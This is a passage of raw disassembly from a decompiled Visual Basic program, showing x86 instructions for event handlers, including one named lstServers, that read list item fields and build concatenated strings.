  '00505A9A: lea ecx, [ebp-74h]
  '00505A9D: push ecx
  '00505A9E: lea edx, [ebp-64h]
  '00505AA1: push edx
  '00505AA2: lea eax, [ebp-54h]
  '00505AA5: push eax
  '00505AA6: mov ecx, [ebp-000000B0h]
  '00505AAC: mov edx, [ecx]
  '00505AAE: mov eax, [ebp-000000B0h]
  '00505AB4: push eax
  '00505AB5: call [edx+3Ch]
  '00505AB8: fclex 
  '00505ABA: mov [ebp-000000B4h], eax
  '00505AC0: cmp [ebp-000000B4h], 00000000h
  '00505AC7: jnl 505AECh
  '00505AC9: push 0000003Ch
  '00505ACB: push 00422944h
  '00505AD0: mov ecx, [ebp-000000B0h]
  '00505AD6: push ecx
  '00505AD7: mov edx, [ebp-000000B4h]
  '00505ADD: push edx
  '00505ADE: call [004010A0h]
  '00505AE4: mov [ebp-00000128h], eax
  '00505AEA: jmp 505AF6h
  '00505AEC: mov [ebp-00000128h], 00000000h
  '00505AF6: lea eax, [ebp-44h]
  '00505AF9: push eax
  '00505AFA: lea ecx, [ebp-40h]
  '00505AFD: push ecx
  '00505AFE: push 00000002h
  '00505B00: call [00401064h]
  '00505B06: add esp, 0000000Ch
  '00505B09: lea edx, [ebp-74h]
  '00505B0C: push edx
  '00505B0D: lea eax, [ebp-64h]
  '00505B10: push eax
  '00505B11: lea ecx, [ebp-54h]
  '00505B14: push ecx
  '00505B15: push 00000003h
  '00505B17: call [00401050h]
  '00505B1D: add esp, 00000010h
  '00505B20: mov [ebp-10h], 00000000h
  '00505B27: push 00505B95h
  '00505B2C: jmp 505B76h
  '00505B2E: lea edx, [ebp-34h]
  '00505B31: push edx
  '00505B32: call [004013A8h]
  '00505B38: lea eax, [ebp-38h]
  '00505B3B: push eax
  '00505B3C: call [004013A8h]
  '00505B42: lea ecx, [ebp-3Ch]
  '00505B45: call [004013B4h]
  '00505B4B: lea ecx, [ebp-44h]
  '00505B4E: push ecx
  '00505B4F: lea edx, [ebp-40h]
  '00505B52: push edx
  '00505B53: push 00000002h
  '00505B55: call [00401064h]
  '00505B5B: add esp, 0000000Ch
  '00505B5E: lea eax, [ebp-74h]
  '00505B61: push eax
  '00505B62: lea ecx, [ebp-64h]
  '00505B65: push ecx
  '00505B66: lea edx, [ebp-54h]
  '00505B69: push edx
  '00505B6A: push 00000003h
  '00505B6C: call [00401050h]
  '00505B72: add esp, 00000010h
  '00505B75: ret 
End Sub
Private Sub lstServers__501A20
  '00501A20: push ebp
  '00501A21: mov ebp, esp
  '00501A23: sub esp, 0000000Ch
  '00501A26: push 004081B6h
  '00501A2B: mov eax, fs:[00h]
  '00501A31: push eax
  '00501A32: mov fs:[00000000h], esp
  '00501A39: sub esp, 00000290h
  '00501A3F: push ebx
  '00501A40: push esi
  '00501A41: push edi
  '00501A42: mov [ebp-0Ch], esp
  '00501A45: mov [ebp-08h], 00405F70h
  '00501A4C: mov ebx, [ebp+08h]
  '00501A4F: mov eax, ebx
  '00501A51: and eax, 00000001h
  '00501A54: mov [ebp-04h], eax
  '00501A57: and ebx, FFFFFFFEh
  '00501A5A: push ebx
  '00501A5B: mov [ebp+08h], ebx
  '00501A5E: mov ecx, [ebx]
  '00501A60: call [ecx+04h]
  '00501A63: mov edx, [ebx]
  '00501A65: xor esi, esi
  '00501A67: push ebx
  '00501A68: mov [ebp-18h], esi
  '00501A6B: mov [ebp-1Ch], esi
  '00501A6E: mov [ebp-20h], esi
  '00501A71: mov [ebp-24h], esi
  '00501A74: mov [ebp-28h], esi
  '00501A77: mov [ebp-2Ch], esi
  '00501A7A: mov [ebp-30h], esi
  '00501A7D: mov [ebp-34h], esi
  '00501A80: mov [ebp-38h], esi
  '00501A83: mov [ebp-3Ch], esi
  '00501A86: mov [ebp-40h], esi
  '00501A89: mov [ebp-44h], esi
  '00501A8C: mov [ebp-48h], esi
  '00501A8F: mov [ebp-4Ch], esi
  '00501A92: mov [ebp-50h], esi
  '00501A95: mov [ebp-54h], esi
  '00501A98: mov [ebp-58h], esi
  '00501A9B: mov [ebp-5Ch], esi
  '00501A9E: mov [ebp-60h], esi
  '00501AA1: mov [ebp-64h], esi
  '00501AA4: mov [ebp-68h], esi
  '00501AA7: mov [ebp-6Ch], esi
  '00501AAA: mov [ebp-70h], esi
  '00501AAD: mov [ebp-74h], esi
  '00501AB0: mov [ebp-78h], esi
  '00501AB3: mov [ebp-7Ch], esi
  '00501AB6: mov [ebp-80h], esi
  '00501AB9: mov [ebp-00000090h], esi
  '00501ABF: mov [ebp-000000A0h], esi
  '00501AC5: mov [ebp-000000B0h], esi
  '00501ACB: mov [ebp-000000C0h], esi
  '00501AD1: mov [ebp-000000D0h], esi
  '00501AD7: mov [ebp-000000E0h], esi
  '00501ADD: mov [ebp-000000F0h], esi
  '00501AE3: mov [ebp-00000100h], esi
  '00501AE9: mov [ebp-00000110h], esi
  '00501AEF: mov [ebp-00000120h], esi
  '00501AF5: mov [ebp-00000130h], esi
  '00501AFB: mov [ebp-00000140h], esi
  '00501B01: mov [ebp-00000150h], esi
  '00501B07: mov [ebp-00000160h], esi
  '00501B0D: mov [ebp-00000170h], esi
  '00501B13: mov [ebp-00000180h], esi
  '00501B19: mov [ebp-00000190h], esi
  '00501B1F: mov [ebp-000001A0h], esi
  '00501B25: mov [ebp-000001B0h], esi
  '00501B2B: mov [ebp-000001C0h], esi
  '00501B31: mov [ebp-000001D0h], esi
  '00501B37: mov [ebp-000001E0h], esi
  '00501B3D: mov [ebp-000001F0h], esi
  '00501B43: mov [ebp-00000200h], esi
  '00501B49: mov [ebp-00000210h], esi
  '00501B4F: mov [ebp-00000214h], esi
  '00501B55: mov [ebp-00000218h], esi
  '00501B5B: mov [ebp-0000021Ch], esi
  '00501B61: mov [ebp-00000220h], esi
  '00501B67: mov [ebp-00000224h], esi
  '00501B6D: mov [ebp-00000228h], esi
  '00501B73: mov [ebp-0000022Ch], esi
  '00501B79: call [edx+0000030Ch]
  '00501B7F: push eax
  '00501B80: lea eax, [ebp-64h]
  '00501B83: push eax
  '00501B84: call [004010E4h]
  '00501B8A: mov edi, eax
  '00501B8C: lea edx, [ebp-18h]
  '00501B8F: push edx
  '00501B90: push edi
  '00501B91: mov ecx, [edi]
  '00501B93: call [ecx+000000F8h]
  '00501B99: cmp eax, esi
  '00501B9B: fclex 
  '00501B9D: jnl 501BB5h
  '00501B9F: push 000000F8h
  '00501BA4: push 0041FB8Ch
  '00501BA9: push edi
  '00501BAA: mov edi, [004010A0h]
  '00501BB0: push eax
  '00501BB1: call edi
  '00501BB3: jmp 501BBBh
  '00501BB5: mov edi, [004010A0h]
  '00501BBB: mov eax, [ebp-18h]
  '00501BBE: lea ecx, [ebp-000000A0h]
  '00501BC4: mov [ebp-00000088h], eax
  '00501BCA: lea eax, [ebp-00000090h]
  '00501BD0: push eax
  '00501BD1: push ecx
  '00501BD2: mov [ebp-18h], esi
  '00501BD5: mov [ebp-00000090h], 00000008h
  '00501BDF: call [00401074h]
  '00501BE5: lea edx, [ebp-000000A0h]
  '00501BEB: push 00000001h
  '00501BED: lea eax, [ebp-000001A0h]
  '00501BF3: push edx
  '00501BF4: push eax
  '00501BF5: lea ecx, [ebp-000000B0h]
  '00501BFB: push esi
  '00501BFC: push ecx
  '00501BFD: mov [ebp-00000198h], 00428A54h
  '00501C07: mov [ebp-000001A0h], 00000008h
  '00501C11: mov [ebp-000001A8h], esi
  '00501C17: mov [ebp-000001B0h], 00008002h
  '00501C21: call [00401260h]
  '00501C27: lea edx, [ebp-000001B0h]
  '00501C2D: push eax
  '00501C2E: push edx
  '00501C2F: call [00401308h]
  '00501C35: lea ecx, [ebp-64h]
  '00501C38: mov [ebp-00000238h], ax
  '00501C3F: call [004013B8h]
  '00501C45: lea eax, [ebp-000000B0h]
  '00501C4B: lea ecx, [ebp-000000A0h]
  '00501C51: push eax
  '00501C52: lea edx, [ebp-00000090h]
  '00501C58: push ecx
  '00501C59: push edx
  '00501C5A: push 00000003h
  '00501C5C: call [00401050h]
  '00501C62: add esp, 00000010h
  '00501C65: cmp [ebp-00000238h], si
  '00501C6C: jnz 0050238Dh
  '00501C72: mov eax, [ebx]
  '00501C74: push ebx
  '00501C75: call [eax+0000030Ch]
  '00501C7B: lea ecx, [ebp-64h]
  '00501C7E: push eax
  '00501C7F: push ecx
  '00501C80: call [004010E4h]
  '00501C86: mov edx, [eax]
  '00501C88: lea ecx, [ebp-00000214h]
  '00501C8E: push ecx
  '00501C8F: push eax
  '00501C90: mov [ebp-00000230h], eax
  '00501C96: call [edx+000000E0h]
  '00501C9C: cmp eax, esi
  '00501C9E: fclex 
  '00501CA0: jnl 501CB6h
  '00501CA2: mov edx, [ebp-00000230h]
  '00501CA8: push 000000E0h
  '00501CAD: push 0041FB8Ch
  '00501CB2: push edx
  '00501CB3: push eax
  '00501CB4: call edi
  '00501CB6: mov eax, [ebx]
  '00501CB8: push ebx
  '00501CB9: call [eax+0000030Ch]
  '00501CBF: lea ecx, [ebp-68h]
  '00501CC2: push eax
  '00501CC3: push ecx
  '00501CC4: call [004010E4h]
  '00501CCA: mov edx, [eax]
  '00501CCC: lea ecx, [ebp-00000218h]
  '00501CD2: push ecx
  '00501CD3: push eax
  '00501CD4: mov [ebp-00000238h], eax
  '00501CDA: call [edx+000000E0h]
  '00501CE0: cmp eax, esi
  '00501CE2: fclex 
  '00501CE4: jnl 501CFAh
  '00501CE6: mov edx, [ebp-00000238h]
  '00501CEC: push 000000E0h
  '00501CF1: push 0041FB8Ch
  '00501CF6: push edx
  '00501CF7: push eax
  '00501CF8: call edi
  '00501CFA: mov eax, [ebx]
  '00501CFC: push ebx
  '00501CFD: call [eax+0000030Ch]
  '00501D03: lea ecx, [ebp-6Ch]
  '00501D06: push eax
  '00501D07: push ecx
  '00501D08: call [004010E4h]
  '00501D0E: mov edx, [eax]
  '00501D10: lea ecx, [ebp-0000021Ch]
  '00501D16: push ecx
  '00501D17: push eax
  '00501D18: mov [ebp-00000240h], eax
  '00501D1E: call [edx+000000E0h]
  '00501D24: cmp eax, esi
  '00501D26: fclex 
  '00501D28: jnl 501D3Eh
  '00501D2A: mov edx, [ebp-00000240h]
  '00501D30: push 000000E0h
  '00501D35: push 0041FB8Ch
  '00501D3A: push edx
  '00501D3B: push eax
  '00501D3C: call edi
  '00501D3E: mov eax, [ebx]
  '00501D40: push ebx
  '00501D41: call [eax+0000030Ch]
  '00501D47: lea ecx, [ebp-70h]
  '00501D4A: push eax
  '00501D4B: push ecx
  '00501D4C: call [004010E4h]
  '00501D52: mov edx, [eax]
  '00501D54: lea ecx, [ebp-00000220h]
  '00501D5A: push ecx
  '00501D5B: push eax
  '00501D5C: mov [ebp-00000248h], eax
  '00501D62: call [edx+000000E0h]
  '00501D68: cmp eax, esi
  '00501D6A: fclex 
  '00501D6C: jnl 501D82h
  '00501D6E: mov edx, [ebp-00000248h]
  '00501D74: push 000000E0h
  '00501D79: push 0041FB8Ch
  '00501D7E: push edx
  '00501D7F: push eax
  '00501D80: call edi
  '00501D82: mov eax, [ebx]
  '00501D84: push ebx
  '00501D85: call [eax+0000030Ch]
  '00501D8B: lea ecx, [ebp-74h]
  '00501D8E: push eax
  '00501D8F: push ecx
  '00501D90: call [004010E4h]
  '00501D96: mov edx, [eax]
  '00501D98: lea ecx, [ebp-00000224h]
  '00501D9E: push ecx
  '00501D9F: push eax
  '00501DA0: mov [ebp-00000250h], eax
  '00501DA6: call [edx+000000E0h]
  '00501DAC: cmp eax, esi
  '00501DAE: fclex 
  '00501DB0: jnl 501DC6h
  '00501DB2: mov edx, [ebp-00000250h]
  '00501DB8: push 000000E0h
  '00501DBD: push 0041FB8Ch
  '00501DC2: push edx
  '00501DC3: push eax
  '00501DC4: call edi
  '00501DC6: mov eax, [ebx+34h]
  '00501DC9: lea edx, [ebp-54h]
  '00501DCC: push edx
  '00501DCD: mov dx, [ebp-00000224h]
  '00501DD4: mov ecx, [eax]
  '00501DD6: add dx, 0001h
  '00501DDA: jo 005024BCh
  '00501DE0: push edx
  '00501DE1: push eax
  '00501DE2: call [ecx+34h]
  '00501DE5: cmp eax, esi
  '00501DE7: fclex 
  '00501DE9: jnl 501DF9h
  '00501DEB: mov ecx, [ebx+34h]
  '00501DEE: push 00000034h
  '00501DF0: push 004289C8h
  '00501DF5: push ecx
  '00501DF6: push eax
  '00501DF7: call edi
  '00501DF9: mov edx, [ebx]
  '00501DFB: push ebx
  '00501DFC: call [edx+0000030Ch]
  '00501E02: push eax
  '00501E03: lea eax, [ebp-78h]
  '00501E06: push eax
  '00501E07: call [004010E4h]
  '00501E0D: mov ecx, [eax]
  '00501E0F: lea edx, [ebp-00000228h]
  '00501E15: push edx
  '00501E16: push eax
  '00501E17: mov [ebp-0000025Ch], eax
  '00501E1D: call [ecx+000000E0h]
  '00501E23: cmp eax, esi
  '00501E25: fclex 
  '00501E27: jnl 501E3Dh
  '00501E29: mov ecx, [ebp-0000025Ch]
  '00501E2F: push 000000E0h
  '00501E34: push 0041FB8Ch
  '00501E39: push ecx
  '00501E3A: push eax
  '00501E3B: call edi
  '00501E3D: mov eax, [ebx+34h]
  '00501E40: lea ecx, [ebp-58h]
  '00501E43: push ecx
  '00501E44: mov cx, [ebp-00000228h]
  '00501E4B: mov edx, [eax]
  '00501E4D: add cx, 0001h
  '00501E51: jo 005024BCh
  '00501E57: push ecx
  '00501E58: push eax
  '00501E59: call [edx+30h]
  '00501E5C: cmp eax, esi
  '00501E5E: fclex 
  '00501E60: jnl 501E70h
  '00501E62: mov edx, [ebx+34h]
  '00501E65: push 00000030h
  '00501E67: push 004289C8h
  '00501E6C: push edx
  '00501E6D: push eax
  '00501E6E: call edi
  '00501E70: mov eax, [ebx]
  '00501E72: push ebx
  '00501E73: call [eax+0000030Ch]
  '00501E79: lea ecx, [ebp-7Ch]
  '00501E7C: push eax
  '00501E7D: push ecx
  '00501E7E: call [004010E4h]
  '00501E84: mov edx, [eax]
  '00501E86: lea ecx, [ebp-0000022Ch]
  '00501E8C: push ecx
  '00501E8D: push eax
  '00501E8E: mov [ebp-00000268h], eax
  '00501E94: call [edx+000000E0h]
  '00501E9A: cmp eax, esi
  '00501E9C: fclex 
  '00501E9E: jnl 501EB4h
  '00501EA0: mov edx, [ebp-00000268h]
  '00501EA6: push 000000E0h
  '00501EAB: push 0041FB8Ch
  '00501EB0: push edx
  '00501EB1: push eax
  '00501EB2: call edi
  '00501EB4: mov eax, [ebx]
  '00501EB6: push ebx
  '00501EB7: call [eax+00000310h]
  '00501EBD: lea ecx, [ebp-80h]
  '00501EC0: push eax
  '00501EC1: push ecx
  '00501EC2: call [004010E4h]
  '00501EC8: lea ecx, [ebp-18h]
  '00501ECB: mov [ebp-00000284h], eax
  '00501ED1: mov eax, [ebx+34h]
  '00501ED4: push ecx
  '00501ED5: mov cx, [ebp-00000214h]
  '00501EDC: mov edx, [eax]
  '00501EDE: add cx, 0001h
  '00501EE2: jo 005024BCh
  '00501EE8: push ecx
  '00501EE9: push eax
  '00501EEA: call [edx+1Ch]
  '00501EED: cmp eax, esi
  '00501EEF: fclex 
  '00501EF1: jnl 501F01h
  '00501EF3: mov edx, [ebx+34h]
  '00501EF6: push 0000001Ch
  '00501EF8: push 004289C8h
  '00501EFD: push edx
  '00501EFE: push eax
  '00501EFF: call edi
  '00501F01: mov eax, [ebx+34h]
  '00501F04: lea edx, [ebp-24h]
  '00501F07: push edx
  '00501F08: mov dx, [ebp-00000218h]
  '00501F0F: mov ecx, [eax]
  '00501F11: add dx, 0001h
  '00501F15: jo 005024BCh
  '00501F1B: push edx
  '00501F1C: push eax
  '00501F1D: call [ecx+20h]
  '00501F20: cmp eax, esi
  '00501F22: fclex 
  '00501F24: jnl 501F34h
  '00501F26: mov ecx, [ebx+34h]
  '00501F29: push 00000020h
  '00501F2B: push 004289C8h
  '00501F30: push ecx
  '00501F31: push eax
  '00501F32: call edi
  '00501F34: mov eax, [ebx+34h]
  '00501F37: lea ecx, [ebp-34h]
  '00501F3A: push ecx
  '00501F3B: mov cx, [ebp-0000021Ch]
  '00501F42: mov edx, [eax]
  '00501F44: add cx, 0001h
  '00501F48: jo 005024BCh
  '00501F4E: push ecx
  '00501F4F: push eax
  '00501F50: call [edx+28h]
  '00501F53: cmp eax, esi
  '00501F55: fclex 
  '00501F57: jnl 501F67h
  '00501F59: mov edx, [ebx+34h]
  '00501F5C: push 00000028h
  '00501F5E: push 004289C8h
  '00501F63: push edx
  '00501F64: push eax
  '00501F65: call edi
  '00501F67: mov eax, [ebx+34h]
  '00501F6A: lea edx, [ebp-44h]
  '00501F6D: push edx
  '00501F6E: mov dx, [ebp-00000220h]
  '00501F75: mov ecx, [eax]
  '00501F77: add dx, 0001h
  '00501F7B: jo 005024BCh
  '00501F81: push edx
  '00501F82: push eax
  '00501F83: call [ecx+2Ch]
  '00501F86: cmp eax, esi
  '00501F88: fclex 
  '00501F8A: jnl 501F9Ah
  '00501F8C: mov ecx, [ebx+34h]
  '00501F8F: push 0000002Ch
  '00501F91: push 004289C8h
  '00501F96: push ecx
  '00501F97: push eax
  '00501F98: call edi
  '00501F9A: mov edx, [ebp-18h]
  '00501F9D: mov esi, [0040108Ch]
  '00501FA3: push 00428A68h
  '00501FA8: push edx
  '00501FA9: call esi
  '00501FAB: mov edi, [00401378h]
  '00501FB1: mov edx, eax
  '00501FB3: lea ecx, [ebp-1Ch]
  '00501FB6: call edi
  '00501FB8: push eax
  '00501FB9: push 0041F414h
  '00501FBE: call esi
  '00501FC0: mov edx, eax
  '00501FC2: lea ecx, [ebp-20h]
  '00501FC5: call edi
  '00501FC7: push eax
  '00501FC8: push 00428A84h
  '00501FCD: call esi
  '00501FCF: mov edx, eax
  '00501FD1: lea ecx, [ebp-28h]
  '00501FD4: call edi
  '00501FD6: push eax
  '00501FD7: mov eax, [ebp-24h]
  '00501FDA: push eax
  '00501FDB: call esi
  '00501FDD: mov edx, eax
  '00501FDF: lea ecx, [ebp-2Ch]
  '00501FE2: call edi
  '00501FE4: push eax
  '00501FE5: push 0041F414h
  '00501FEA: call esi
  '00501FEC: mov edx, eax
  '00501FEE: lea ecx, [ebp-30h]
  '00501FF1: call edi
  '00501FF3: push eax
  '00501FF4: push 00428AA4h
  '00501FF9: call esi
  '00501FFB: mov edx, eax
  '00501FFD: lea ecx, [ebp-38h]
  '00502000: call edi
  '00502002: mov ecx, [ebp-34h]
  '00502005: push eax
  '00502006: push ecx
  '00502007: call esi
  '00502009: mov edx, eax
  '0050200B: lea ecx, [ebp-3Ch]
  '0050200E: call edi
  '00502010: push eax
  '00502011: push 0041F414h
  '00502016: call esi
  '00502018: mov edx, eax
  '0050201A: lea ecx, [ebp-40h]
  '0050201D: call edi
  '0050201F: push eax
  '00502020: push 00428AB8h
  '00502025: call esi
  '00502027: mov edx, eax
  '00502029: lea ecx, [ebp-48h]
  '0050202C: call edi
  '0050202E: mov edx, [ebp-44h]
  '00502031: push eax
  '00502032: push edx
  '00502033: call esi
  '00502035: mov edx, eax
  '00502037: lea ecx, [ebp-4Ch]
  '0050203A: call edi
  '0050203C: push eax
  '0050203D: push 0041F414h
  '00502042: call esi
  '00502044: mov edx, eax
  '00502046: lea ecx, [ebp-50h]
  '00502049: call edi
  '0050204B: push eax
  '0050204C: push 00428ADCh
  '00502051: call esi
  '00502053: mov esi, 00000008h
  '00502058: mov [ebp-000000C8h], eax
  '0050205E: mov [ebp-000000D0h], esi
  '00502064: mov [ebp-000001A8h], 00428B00h
  '0050206E: mov [ebp-000001B0h], esi
  '00502074: lea edx, [ebp-000001B0h]
  '0050207A: mov edi, [00401338h]
  '00502080: lea ecx, [ebp-000000B0h]
  '00502086: call edi
  '00502088: lea edx, [ebp-000001A0h]
  '0050208E: lea ecx, [ebp-000000A0h]
  '00502094: mov [ebp-00000198h], 00428AF4h
  '0050209E: mov [ebp-000001A0h], esi
  '005020A4: call edi
  '005020A6: mov eax, [ebp-54h]
  '005020A9: lea ecx, [ebp-000000A0h]
  '005020AF: mov [ebp-00000088h], eax
  '005020B5: lea eax, [ebp-000000B0h]
  '005020BB: push eax
  '005020BC: lea edx, [ebp-00000090h]
  '005020C2: push ecx
  '005020C3: lea eax, [ebp-000000C0h]
  '005020C9: push edx
  '005020CA: push eax
  '005020CB: mov [ebp-54h], 00000000h
  '005020D2: mov [ebp-00000090h], esi
  '005020D8: call [004012DCh]
  '005020DE: lea edx, [ebp-000001F0h]
  '005020E4: lea ecx, [ebp-00000130h]
  '005020EA: mov [ebp-000001B8h], 0041F414h
  '005020F4: mov [ebp-000001C0h], esi
  '005020FA: mov [ebp-000001C8h], 00428B0Ch
  '00502104: mov [ebp-000001D0h], esi
  '0050210A: mov [ebp-000001E8h], 00428B00h
  '00502114: mov [ebp-000001F0h], esi
  '0050211A: call edi
  '0050211C: lea edx, [ebp-000001E0h]
  '00502122: lea ecx, [ebp-00000120h]
  '00502128: mov [ebp-000001D8h], 00428AF4h
  '00502132: mov [ebp-000001E0h], esi
  '00502138: call edi
  '0050213A: mov eax, [ebp-58h]
  '0050213D: lea ecx, [ebp-00000130h]
  '00502143: mov [ebp-00000108h], eax
  '00502149: lea edx, [ebp-00000120h]
  '0050214F: push ecx
  '00502150: lea eax, [ebp-00000110h]
  '00502156: push edx
  '00502157: lea ecx, [ebp-00000140h]
  '0050215D: xor edi, edi
  '0050215F: push eax
  '00502160: push ecx
  '00502161: mov [ebp-58h], edi
  '00502164: mov [ebp-00000110h], esi
  '0050216A: call [004012DCh]
  '00502170: mov eax, [ebx+34h]
  '00502173: lea ecx, [ebp-5Ch]
  '00502176: push ecx
  '00502177: mov cx, [ebp-0000022Ch]
  '0050217E: add cx, 0001h
  '00502182: mov [ebp-000001F8h], 0041F414h
  '0050218C: mov [ebp-00000200h], esi
  '00502192: mov [ebp-00000208h], 00428B3Ch
  '0050219C: mov [ebp-00000210h], esi
  '005021A2: mov edx, [eax]
  '005021A4: jo 005024BCh
  '005021AA: push ecx
  '005021AB: push eax
  '005021AC: call [edx+24h]
  '005021AF: cmp eax, edi
  '005021B1: fclex 
  '005021B3: jnl 5021C7h
  '005021B5: mov edx, [ebx+34h]
  '005021B8: push 00000024h
  '005021BA: push 004289C8h
  '005021BF: push edx
  '005021C0: push eax
  '005021C1: call [004010A0h]
  '005021C7: mov eax, [ebp-5Ch]
  '005021CA: mov ebx, [00401274h]
  '005021D0: mov [ebp-00000178h], eax
  '005021D6: mov eax, [ebp-00000284h]
  '005021DC: mov [ebp-5Ch], edi
  '005021DF: mov [ebp-00000180h], esi
  '005021E5: mov edi, [eax]
  '005021E7: lea ecx, [ebp-000000D0h]
  '005021ED: lea edx, [ebp-000000C0h]
  '005021F3: push ecx
  '005021F4: lea eax, [ebp-000000E0h]
  '005021FA: push edx
  '005021FB: push eax
  '005021FC: call ebx
  '005021FE: lea ecx, [ebp-000001C0h]
  '00502204: push eax
  '00502205: lea edx, [ebp-000000F0h]
  '0050220B: push ecx
  '0050220C: push edx
  '0050220D: call ebx
  '0050220F: push eax
  '00502210: lea eax, [ebp-000001D0h]
  '00502216: lea ecx, [ebp-00000100h]
  '0050221C: push eax
  '0050221D: push ecx
  '0050221E: call ebx
  '00502220: push eax
  '00502221: lea edx, [ebp-00000140h]
  '00502227: lea eax, [ebp-00000150h]
  '0050222D: push edx
  '0050222E: push eax
  '0050222F: call ebx
  '00502231: lea ecx, [ebp-00000200h]
  '00502237: push eax
  '00502238: lea edx, [ebp-00000160h]
  '0050223E: push ecx
  '0050223F: push edx
  '00502240: call ebx
  '00502242: push eax
  '00502243: lea eax, [ebp-00000210h]
  '00502249: lea ecx, [ebp-00000170h]
  '0050224F: push eax
  '00502250: push ecx
  '00502251: call ebx
  '00502253: push eax
  '00502254: lea edx, [ebp-00000180h]
  '0050225A: lea eax, [ebp-00000190h]
  '00502260: push edx
  '00502261: push eax
  '00502262: call ebx
  '00502264: lea ecx, [ebp-60h]
  '00502267: push eax
  '00502268: push ecx
  '00502269: call [0040126Ch]
  '0050226F: mov edx, edi
  '00502271: mov edi, [ebp-00000284h]
  '00502277: push eax
  '00502278: push edi
  '00502279: call [edx+000000A4h]
  '0050227F: test eax, eax
  '00502281: fclex 
  '00502283: jnl 502297h
  '00502285: push 000000A4h
  '0050228A: push 0041E3FCh
  '0050228F: push edi
  '00502290: push eax
  '00502291: call [004010A0h]
  '00502297: lea eax, [ebp-60h]
  '0050229A: lea ecx, [ebp-50h]
  '0050229D: push eax
  '0050229E: lea edx, [ebp-4Ch]
  '005022A1: push ecx
  '005022A2: lea eax, [ebp-44h]
  '005022A5: push edx
  '005022A6: lea ecx, [ebp-48h]
  '005022A9: push eax
  '005022AA: lea edx, [ebp-40h]
  '005022AD: push ecx
  '005022AE: lea eax, [ebp-3Ch]
  '005022B1: push edx
  '005022B2: lea ecx, [ebp-34h]
  '005022B5: push eax
  '005022B6: lea edx, [ebp-38h]
  '005022B9: push ecx
  '005022BA: lea eax, [ebp-30h]
  '005022BD: push edx
  '005022BE: lea ecx, [ebp-2Ch]
  '005022C1: push eax
  '005022C2: lea edx, [ebp-24h]
  '005022C5: push ecx
  '005022C6: lea eax, [ebp-28h]
  '005022C9: push edx
  '005022CA: lea ecx, [ebp-20h]
  '005022CD: push eax
  '005022CE: lea edx, [ebp-1Ch]
  '005022D1: push ecx
  '005022D2: lea eax, [ebp-18h]
  '005022D5: push edx
  '005022D6: push eax
  '005022D7: push 00000010h
  '005022D9: call [004012E8h]
  '005022DF: lea ecx, [ebp-80h]
  '005022E2: lea edx, [ebp-7Ch]
  '005022E5: push ecx
  '005022E6: lea eax, [ebp-78h]
  '005022E9: push edx
  '005022EA: lea ecx, [ebp-74h]
  '005022ED: push eax
  '005022EE: lea edx, [ebp-70h]
  '005022F1: push ecx
  '005022F2: lea eax, [ebp-6Ch]
  '005022F5: push edx
  '005022F6: lea ecx, [ebp-68h]
  '005022F9: push eax
  '005022FA: lea edx, [ebp-64h]
  '005022FD: push ecx
  '005022FE: push edx
  '005022FF: push esi
  '00502300: call [00401064h]
  '00502306: add esp, 00000068h
  '00502309: lea eax, [ebp-00000190h]
  '0050230F: lea ecx, [ebp-00000180h]
  '00502315: lea edx, [ebp-00000170h]
  '0050231B: push eax
  '0050231C: push ecx
  '0050231D: lea eax, [ebp-00000160h]
  '00502323: push edx
  '00502324: lea ecx, [ebp-00000150h]
  '0050232A: push eax
  '0050232B: lea edx, [ebp-00000140h]
  '00502331: push ecx
  '00502332: lea eax, [ebp-00000100h]
  '00502338: push edx
  '00502339: lea ecx, [ebp-00000130h]
  '0050233F: push eax
  '00502340: lea edx, [ebp-00000120h]
  '00502346: push ecx
  '00502347: lea eax, [ebp-00000110h]
  '0050234D: push edx
  '0050234E: lea ecx, [ebp-000000F0h]
  '00502354: push eax
  '00502355: lea edx, [ebp-000000E0h]
  '0050235B: push ecx
  '0050235C: lea eax, [ebp-000000C0h]
  '00502362: push edx
  '00502363: lea ecx, [ebp-000000D0h]
  '00502369: push eax
  '0050236A: push ecx
  '0050236B: lea edx, [ebp-000000B0h]
  '00502371: lea eax, [ebp-000000A0h]
  '00502377: push edx
  '00502378: lea ecx, [ebp-00000090h]
  '0050237E: push eax
  '0050237F: push ecx
  '00502380: push 00000011h
  '00502382: call [00401050h]
  '00502388: add esp, 00000048h
  '0050238B: xor esi, esi
  '0050238D: mov [ebp-04h], esi
  '00502390: push 0050249Dh
  '00502395: jmp 0050249Ch
  '0050239A: lea edx, [ebp-60h]
  '0050239D: lea eax, [ebp-5Ch]
  '005023A0: push edx
  '005023A1: lea ecx, [ebp-58h]
  '005023A4: push eax
  '005023A5: lea edx, [ebp-54h]
  '005023A8: push ecx
  '005023A9: lea eax, [ebp-50h]
  '005023AC: push edx
  '005023AD: lea ecx, [ebp-4Ch]
  '005023B0: push eax
  '005023B1: lea edx, [ebp-48h]
  '005023B4: push ecx
  '005023B5: lea eax, [ebp-44h]
  '005023B8: push edx
  '005023B9: lea ecx, [ebp-40h]
  '005023BC: push eax
  '005023BD: lea edx, [ebp-3Ch]
  '005023C0: push ecx
  '005023C1: lea eax, [ebp-38h]
  '005023C4: push edx
  '005023C5: lea ecx, [ebp-34h]
  '005023C8: push eax
  '005023C9: lea edx, [ebp-30h]
  '005023CC: push ecx
  '005023CD: lea eax, [ebp-2Ch]
  '005023D0: push edx
  '005023D1: lea ecx, [ebp-28h]
  '005023D4: push eax
  '005023D5: lea edx, [ebp-24h]
  '005023D8: push ecx
  '005023D9: lea eax, [ebp-20h]
  '005023DC: push edx
  '005023DD: lea ecx, [ebp-1Ch]
  '005023E0: push eax
  '005023E1: lea edx, [ebp-18h]
  '005023E4: push ecx
  '005023E5: push edx
  '005023E6: push 00000013h
  '005023E8: call [004012E8h]
  '005023EE: lea eax, [ebp-80h]
  '005023F1: lea ecx, [ebp-7Ch]
  '005023F4: push eax
  '005023F5: lea edx, [ebp-78h]
  '005023F8: push ecx
  '005023F9: lea eax, [ebp-74h]
  '005023FC: push edx
  '005023FD: lea ecx, [ebp-70h]
  '00502400: push eax
  '00502401: lea edx, [ebp-6Ch]
  '00502404: push ecx
  '00502405: lea eax, [ebp-68h]
  '00502408: push edx
  '00502409: lea ecx, [ebp-64h]
  '0050240C: push eax
  '0050240D: push ecx
  '0050240E: push 00000008h
  '00502410: call [00401064h]
  '00502416: add esp, 00000074h
  '00502419: lea edx, [ebp-00000190h]
  '0050241F: lea eax, [ebp-00000180h]
  '00502425: lea ecx, [ebp-00000170h]
  '0050242B: push edx
  '0050242C: push eax
  '0050242D: lea edx, [ebp-00000160h]
  '00502433: push ecx
  '00502434: lea eax, [ebp-00000150h]
  '0050243A: push edx
  '0050243B: lea ecx, [ebp-00000140h]
  '00502441: push eax
